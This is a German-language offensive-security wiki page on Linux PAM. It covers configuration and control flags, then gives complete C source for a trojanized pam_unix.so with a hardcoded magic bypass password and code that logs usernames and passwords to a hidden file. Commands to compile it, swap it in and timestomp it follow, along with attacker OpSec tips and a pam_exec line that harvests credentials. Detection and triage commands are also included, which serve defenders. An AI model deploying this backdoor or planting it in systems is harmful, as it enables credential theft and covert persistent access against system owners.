# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Grundlegende Informationen

**PAM (Pluggable Authentication Modules)** ist ein Sicherheitsmechanismus, der **die Identität von Benutzern überprüft, die auf Computerdienste zugreifen möchten**, und ihren Zugriff anhand verschiedener Kriterien steuert. Es ist mit einem digitalen Pförtner vergleichbar, der sicherstellt, dass nur autorisierte Benutzer bestimmte Dienste nutzen können, und ihre Nutzung gegebenenfalls einschränkt, um eine Überlastung des Systems zu verhindern.

#### Konfigurationsdateien

- **Solaris** unterstützt die veraltete zentrale Datei `/etc/pam.conf`, aber aktuelle Empfehlungen bevorzugen Dienstdateien unter `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux-Systeme** bevorzugen einen Verzeichnisansatz und speichern dienstspezifische Konfigurationen in `/etc/pam.d`. Die Konfigurationsdatei für den Anmeldedienst befindet sich beispielsweise unter `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Eine beispielhafte PAM-Konfiguration für den Anmeldedienst könnte so aussehen:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM-Verwaltungsbereiche**

Diese Bereiche oder Verwaltungsgruppen umfassen **auth**, **account**, **password** und **session**. Jeder ist für unterschiedliche Aspekte des Authentifizierungs- und Sitzungsverwaltungsprozesses zuständig:<sup>[[1]](#references)</sup>

- **Auth**: Überprüft die Benutzeridentität, häufig durch Abfrage eines Passworts.
- **Account**: Überprüft das Konto und prüft Bedingungen wie die Gruppenmitgliedschaft oder zeitliche Einschränkungen.
- **Password**: Verwaltet Passwortänderungen, einschließlich Komplexitätsprüfungen und Schutz vor Wörterbuchangriffen.
- **Session**: Verwaltet Aktionen beim Start oder Ende einer Dienstsitzung, etwa das Einhängen von Verzeichnissen oder das Festlegen von Ressourcenlimits.

#### **PAM-Modulsteuerungen**

Die Steuerungen legen fest, wie das Modul auf Erfolg oder Fehlschlag reagiert, und beeinflussen den gesamten Authentifizierungsprozess. Dazu gehören:<sup>[[1]](#references)</sup>

- **Required**: Das Fehlschlagen eines erforderlichen Moduls führt letztlich zum Fehlschlag, aber erst, nachdem alle nachfolgenden Module geprüft wurden.
- **Requisite**: Bei einem Fehlschlag wird der Prozess sofort beendet.
- **Sufficient**: Wenn kein vorheriges `required`-Modul fehlgeschlagen ist, wird bei Erfolg sofort zurückgekehrt und die Verarbeitung der übrigen Module derselben Verwaltungsgruppe übersprungen.
- **Optional**: Führt nur dann zum Fehlschlag, wenn es das einzige Modul im Stack ist.

#### Offensive Semantik, auf die es ankommt

Bei der Analyse oder Änderung von PAM bestimmt die **Position einer eingefügten Regel**, welcher Stack sie verarbeitet:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` und `substack` binden Regeln aus anderen Dateien ein. Eine Änderung an `sshd` betrifft daher möglicherweise nur SSH, während eine Änderung an `system-auth`, `common-auth` oder einem anderen gemeinsam genutzten Stack mehrere Dienste gleichzeitig betrifft.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM unterstützt auch Steuerungen in eckigen Klammern, etwa `[success=1 default=ignore]`. Diese lassen sich missbrauchen, um nach einer erfolgreichen benutzerdefinierten Prüfung **ein oder mehrere Module zu überspringen**, statt `pam_unix.so` sichtbar zu ersetzen.<sup>[[1]](#references)</sup>
- Der `module-path` kann **absolut** (`/usr/lib/security/pam_custom.so`) oder relativ zum standardmäßigen PAM-Modulverzeichnis sein. Auf modernen Linux-Systemen sind die tatsächlichen Verzeichnisse oft `/lib/security`, `/lib64/security`, `/usr/lib/security` oder Multiarch-Pfade wie `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kurzer Hinweis für Operatoren: Vor Änderungen immer den **vollständigen Dienstgraphen** erfassen. Zum Beispiel kann `sshd -> password-auth -> system-auth` auf manchen Distributionen oder `sshd -> system-remote-login -> system-login -> system-auth` auf anderen dazu führen, dass sich dasselbe einzeilige Implantat viel weiter ausbreitet als beabsichtigt.<sup>[[1]](#references)[[13]](#references)</sup>

Ein benutzerdefiniertes `auth`-Modul kann `sudo` nach dem Kontopasswort um eine interaktive Challenge ergänzen. Prüfen Sie den effektiven Stack in `/etc/pam.d/sudo`, die eingebundene Richtlinie, die Modulargumente und die Berechtigungen jeder referenzierten lokalen Datendatei, bevor Sie die Challenge manuell untersuchen. Eine lesbare Wortliste für die Challenge umgeht weder die Passwortprüfung noch gewährt sie einen sudoers-Eintrag. Ein privilegierter Übergang erfordert weiterhin die korrekte Kontoauthentifizierung, den Abschluss aller erforderlichen PAM-Schritte und eine sudo-Regel, die Root-Rechte erlaubt. Eine unbeaufsichtigte Enumeration sollte die Challenge nicht auslösen.

Überprüfen Sie beim veralteten Ubuntu-Fehler [`pam_motd`-Besitzrechte (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) den tatsächlichen Build von `libpam-modules` und ob ein Login-Dienst das betroffene Session-Modul aufruft. Ubuntu behob den Fehler in **1.1.0-2ubuntu1.1** für 9.10 und **1.1.1-2ubuntu5** für 10.04 LTS; andere Releases oder Backports von Anbietern müssen jeweils separat anhand ihrer Pakete bewertet werden. Für den gemeldeten Angriffspfad musste der Aufrufer sein Home-Verzeichnis `.cache` durch einen Symlink ersetzen und anschließend einen PAM-Login auslösen. Dadurch änderte das alte Modul die Besitzrechte eines geschützten Ziels. Ein `.cache`-Eintrag, eine `pam_motd.so`-Zeile oder eine alte Kernelversion allein belegen keine Anfälligkeit. Prüfen Sie die Kontrolle über das Home-Verzeichnis, die effektive Modulversion, die Erreichbarkeit über den Login, die Symlink-Behandlung und die Zielberechtigungen, ohne Dateien zu ersetzen oder während einer passiven Enumeration einen Login zu starten. Siehe [Ubuntus Sicherheitshinweis](https://ubuntu.com/security/notices/USN-959-1).

#### Beispielszenario

Bei einer Konfiguration mit mehreren auth-Modulen läuft der Prozess in einer festen Reihenfolge ab. Wenn das Modul `pam_securetty` feststellt, dass das Login-Terminal nicht autorisiert ist, werden Root-Logins blockiert. Dennoch werden aufgrund des Status „required“ alle Module weiterverarbeitet. `pam_env` setzt Umgebungsvariablen, was möglicherweise die Benutzerfreundlichkeit verbessert. Die Module `pam_ldap` und `pam_unix` arbeiten bei der Authentifizierung des Benutzers zusammen. Dabei versucht `pam_unix`, ein zuvor bereitgestelltes Passwort zu verwenden, was die Authentifizierung effizienter und flexibler macht.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` in einem Dienst-Stack

`pam_permit.so` gibt bei PAM-Prüfungen Erfolg zurück. Wenn ein Benutzer mit geringeren Rechten die effektive PAM-Richtlinie eines Dienstes ändern kann, lässt sich die Passwortprüfung für diesen Dienst entfernen, indem das Modul mit einem Kontroll-Flag eingefügt wird, das den Authentifizierungs-Stack vorzeitig beendet. Prüfen Sie bei `sudo` `/etc/pam.d/sudo` und alle eingebundenen Dateien wie `common-auth` oder `system-auth`, bevor Sie entscheiden, welche Dienste betroffen sind. Eine Umgehung der PAM-Authentifizierung **gewährt keine neue sudoers-Regel**; der Benutzer muss weiterhin berechtigt sein, den angeforderten Befehl auszuführen. Prüfen Sie die Regelreihenfolge und mögliche vorherige `required`-Fehlschläge, statt davon auszugehen, dass eine einzelne Zeile `sufficient pam_permit.so` immer zum Erfolg führt.

## PAM backdooren – `pam_unix.so` hooken

Ein klassischer Persistence-Trick in Linux-Umgebungen mit hohem Schutzbedarf ist es, **die legitime PAM-Bibliothek durch ein trojanisiertes Drop-in zu ersetzen**. Auf einem Host, dessen PAM-Stack `pam_unix.so` lädt, kann die SSH- oder Konsolen-Authentifizierung dessen Einstiegspunkt `pam_sm_authenticate()` aufrufen. Ein bösartiger Ersatz kann Zugangsdaten abfangen oder ein *magisches* Passwort zur Umgehung der Authentifizierung implementieren.<sup>[[2]](#references)[[11]](#references)</sup>

### Kompilierungs-Spickzettel
Die folgende Skizze verwendet Linux-PAMs Diensteinstiegspunkt `pam_sm_authenticate()` und `pam_get_authtok()`, um auf das Authentifizierungstoken zuzugreifen.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Beispiel für einen `pam_unix.so`-Trojaner</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Kompilieren und unauffällig ersetzen (das Replacement-/Timestomp-Muster ist von Unit 42 dokumentiert). Passe sowohl den im Wrapper fest codierten Backup-Pfad als auch die unten stehenden Befehle an das tatsächliche PAM-Modulverzeichnis des Ziels an:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec-Tipps
1. **Atomisches Überschreiben** – schreibe eine vollständige Bibliothek in eine temporäre Datei und benenne sie an ihren endgültigen Speicherort um, damit kein teilweise geschriebenes Authentifizierungsmodul zurückbleibt.
2. Ein Pfad wie `/usr/bin/.dbus.log` wurde in der AuthDoor-Analyse von Unit 42 beobachtet und ist daher auch ein nützlicher Indikator für die Suche.<sup>[[2]](#references)</sup>
3. Bewahre die vom PAM-Stack erwarteten Einstiegspunkte (z. B. `pam_sm_authenticate` und `pam_sm_setcred`), damit andere Verwaltungsoperationen weiterhin funktionieren.<sup>[[11]](#references)[[18]](#references)</sup>

### Erkennung
Bei Prüfungen der Paketintegrität verifiziert RPM die Metadaten installierter Dateien, `debsums -s` meldet Prüfsummenfehler, und `dpkg -S` fragt im Triage-Block die Paketzugehörigkeit ab; die Syntax der Audit-Überwachung protokolliert Schreibvorgänge und Attributänderungen an einem Pfad.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Vergleiche den MD5-/SHA256-Hash von `pam_unix.so` mit dem des Distributionspakets.
* Verwende `rpm -V pam` oder `debsums -s libpam-modules`, um ersetzte Bibliotheken ohne manuelles Hashing zu erkennen.
* Prüfe auf weltweit beschreibbare Dateien oder ungewöhnliche Besitzverhältnisse unter `/lib/security/`.
* `auditd`-Regel: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Durchsuche PAM-Konfigurationen nach unerwarteten Modulen: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Diese `pam_`-Suche erfasst keine benutzerdefinierten Module mit anderen `.so`-Dateinamen. Überprüfe die **aktiven** Zeilen `auth`, `account`, `password` und `session` in `/etc/pam.d` (und gegebenenfalls in `/etc/pam.conf`), einschließlich ihrer Steuerungsflags und aller eingebundenen Stacks. Ein unbekanntes Modul, das als `auth sufficient` vor der normalen Passwortprüfung platziert ist, sollte Anlass geben, die Paketzugehörigkeit und die Binärdatei zu überprüfen; [PAMs Steuerungssyntax](https://man7.org/linux/man-pages/man5/pam.d.5.html) kann bewirken, dass ein Erfolg diesen Teil des Stacks vorzeitig beendet. Ein Modulname, ein ungewöhnlicher Zeitstempel oder eine `nodelay`-Option allein beweisen keinen Bypass. Wenn das Verhalten auf einen Timing-Leak hindeutet, überprüfe zuerst die Implementierung und die Erreichbarkeit des Dienstes; bei routinemäßiger Enumeration sollten nicht wiederholt Authentifizierungsversuche mit verschiedenen Zugangsdaten unternommen werden.

### Schnelle Triage-Befehle (nach einer Kompromittierung oder zur Bedrohungssuche)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Missbrauch von `pam_exec` für Persistenz
Statt `pam_unix.so` zu ersetzen, ist es ein dezenterer Eingriff, in `/etc/pam.d/sshd` eine `pam_exec`-Zeile anzuhängen, sodass ein Aufruf, der diese PAM-Zeile erreicht, einen Helfer ausführt, während der normale Stack intakt bleibt.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` erhält PAM-Metadaten in Umgebungsvariablen wie `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` und `PAM_TYPE`. Mit `expose_authtok` kann der Helfer während der Phasen `auth` oder `password` bis zu `PAM_MAX_RESP_SIZE` Bytes des Passworts aus `stdin` lesen. Wenn der Helfer statt mit der realen UID mit der effektiven UID laufen soll, füge `seteuid` hinzu.<sup>[[4]](#references)</sup>

Die folgenden praktischen Hinweise orientieren sich an den für `pam_exec` dokumentierten Modultypen und dem Filter `type=`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` eignet sich besser für **Aktionen nach dem Login**, etwa das erneute Öffnen von Sockets oder das Starten eines abgekoppelten Daemons.
- `auth optional pam_exec.so quiet expose_authtok ...` ist die übliche Wahl zum **Abgreifen von Zugangsdaten**, da der Befehl ausgeführt wird, bevor die Sitzung geöffnet wird.
- Mit `type=session` oder `type=auth` lässt sich die Ausführung auf eine bestimmte PAM-Phase beschränken und eine störende doppelte Ausführung vermeiden.

Bei der Überprüfung von Berechtigungen ist ein absoluter Pfad zu einem `pam_exec.so`-Helfer, in den der aktuelle Benutzer schreiben kann, ein möglicher Angriffsvektor, selbst wenn die Datei mit dem Append-only-Attribut (`a`) markiert ist: [Das Attribut erlaubt das Anhängen](https://man7.org/linux/man-pages/man1/chattr.1.html), was ausreichen kann, um das spätere Verhalten eines Shell-Skripts zu ändern. Prüfe zuerst, ob der PAM-Dienst und das Ereignis diese Zeile tatsächlich erreichen, ob dem Helfer und seinem übergeordneten Pfad vertraut werden kann und ob der Befehl mit einer stärker privilegierten Identität ausgeführt wird; [`seteuid` ändert, welche PAM-UID verwendet wird](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Eine beschreibbare Datei oder ein `lsattr`-Ergebnis allein beweist keine privilegierte Ausführung.

### Distro-Tools überstehen: `authselect`

Auf RHEL- und Fedora-Systemen, die `authselect` verwenden, können direkte Änderungen an generierten Dateien wie `/etc/pam.d/system-auth` oder `/etc/pam.d/password-auth` von `authselect` **überschrieben werden**. Um Änderungen dauerhaft beizubehalten, passen Administratoren häufig das aktive benutzerdefinierte Profil unter `/etc/authselect/custom/<profile>/` an und wählen es anschließend erneut aus.<sup>[[5]](#references)[[19]](#references)</sup>

Üblicher Ablauf mit Root-Rechten:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Dies ist sowohl für Offense als auch für die Triage relevant: Wenn `/etc/pam.d/system-auth` die Banner `Generated by authselect` und `Do not modify this file manually` enthält, befindet sich der eigentliche Persistenzpunkt möglicherweise unter `/etc/authselect/custom/` statt unter `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Aktuelle Vorgehensweisen aus der Praxis

Aktuelle Berichte aus dem Jahr 2025 über die Linux-Backdoor **Plague** zeigten, wie dieselbe Grundidee weiterentwickelt wurde: eine bösartige PAM-Komponente mit einem **statischen Bypass-Passwort**, dazu das Bereinigen von SSH-bezogenen Umgebungsvariablen und des Shell-Verlaufs (`HISTFILE=/dev/null`), um nach der Anmeldung weniger Sitzungsspuren zu hinterlassen.<sup>[[3]](#references)</sup> Das ist ein nützliches Suchmuster, da die Backdoor-Logik in PAM liegen kann, während die Tarnspuren erst **nach** erfolgreicher Authentifizierung auftreten.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Das Playbook des verdeckten Operators: Infiltration globaler Telekommunikationsnetze - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Eine neu entdeckte PAM-basierte Backdoor für Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Benutzerauthentifizierung mit authselect konfigurieren - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian-Handbuchseiten](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian-Handbuchseiten](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Authentifizierung in Oracle Solaris 11.4 verwalten](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Leitfaden zur Authentifizierung auf Systemebene - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu-Paketdateiliste: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian-Handbuchseiten](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Änderungen/Authselect verpflichtend machen - Fedora-Projekt-Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
